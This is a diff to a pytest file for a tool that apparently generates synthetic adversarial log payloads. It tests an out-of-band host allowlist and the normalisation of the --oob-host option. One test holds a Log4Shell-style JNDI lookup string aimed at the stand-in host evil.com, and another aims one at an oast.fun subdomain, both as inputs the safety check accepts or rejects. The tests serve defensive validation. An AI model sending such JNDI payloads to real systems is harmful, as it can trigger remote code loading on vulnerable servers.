@@ -10,6 +10,7 @@ from datetime import UTC, datetime
 from pathlib import Path
 
 import pytest
+import typer
 from pydantic import ValidationError
 
 from evidenceforge.config.payload_families import (
@@ -314,6 +315,62 @@ class TestSafety:
         ap.check_payload_safety(val, oob_hosts=("OOB-SINK.LOCAL",))  # uppercase reg → accepted
         ap.check_payload_safety(val, oob_hosts=("oob-sink.local",))  # lowercase reg → accepted
 
+    def test_oob_host_allowlist_scoped_under_accepted_domain(self):
+        # Suffix matching is scoped strictly UNDER the accepted concrete domain: registering
+        # oast.fun allows abc.oast.fun but never evil.com — the bare-TLD allowlist hazard that
+        # the --oob-host registrable-domain gate exists to prevent.
+        ok = "EFORGE_TEST ${jndi:ldap://abc.oast.fun/EFORGE_TEST}"
+        bad = "EFORGE_TEST ${jndi:ldap://evil.com/EFORGE_TEST}"
+        ap.check_payload_safety(ok, oob_hosts=("oast.fun",))  # under the registered domain
+        with pytest.raises(ap.AdversarialPayloadSafetyError, match="non-allowlisted host"):
+            ap.check_payload_safety(bad, oob_hosts=("oast.fun",))
+
+
+class TestNormalizeOobHosts:
+    """The --oob-host boundary contract shared by `eforge generate` and `eforge validate`."""
+
+    def test_rejects_single_label_and_public_suffix(self):
+        # A bare TLD / single label or a public suffix would allowlist an entire namespace.
+        from evidenceforge.cli.commands import _normalize_oob_hosts
+
+        for bad in ["com", "fun", "local", "co.uk", "ac.uk", "com.au"]:
+            with pytest.raises(typer.Exit):
+                _normalize_oob_hosts([bad])
+
+    def test_accepts_registrable_domains_and_subdomains(self):
+        from evidenceforge.cli.commands import _normalize_oob_hosts
+
+        assert _normalize_oob_hosts(["example.com"]) == ("example.com",)
+        assert _normalize_oob_hosts(["oast.fun"]) == ("oast.fun",)
+        assert _normalize_oob_hosts(["myhost.oast.fun"]) == ("myhost.oast.fun",)
+        assert _normalize_oob_hosts(["myhost.mysubdomain.oast.fun"]) == (
+            "myhost.mysubdomain.oast.fun",
+        )
+
+    def test_preserves_ip_literals(self):
+        from evidenceforge.cli.commands import _normalize_oob_hosts
+
+        assert _normalize_oob_hosts(["127.0.0.1"]) == ("127.0.0.1",)
+        assert _normalize_oob_hosts(["::1"]) == ("::1",)
+
+    def test_rejects_malformed(self):
+        from evidenceforge.cli.commands import _normalize_oob_hosts
+
+        for bad in [
+            "http://127.0.0.1",
+            "127.0.0.1/evil",
+            "sink.local:8080",
+            "user@sink.local",
+            "a b",
+        ]:
+            with pytest.raises(typer.Exit):
+                _normalize_oob_hosts([bad])
+
+    def test_lowercases_and_dedups(self):
+        from evidenceforge.cli.commands import _normalize_oob_hosts
+
+        assert _normalize_oob_hosts(["OAST.fun", "oast.fun", ""]) == ("oast.fun",)
+
 
 # --- Synthesis + per-surface rendering -----------------------------------------
 
@@ -454,10 +511,6 @@ class TestSynthesisRendering:
     def test_payload_family_entry_rejects_proposed_field(self):
         # The 'proposed' concept was removed: every shipped family is supported, so the
         # schema must reject a stray `proposed:` key (extra="forbid").
-        from pydantic import ValidationError
-
-        from evidenceforge.config.schemas import PayloadFamilyEntry
-
         with pytest.raises(ValidationError):
             PayloadFamilyEntry(
                 name="x", surfaces=["syslog_message"], value_template="{marker}", proposed=True
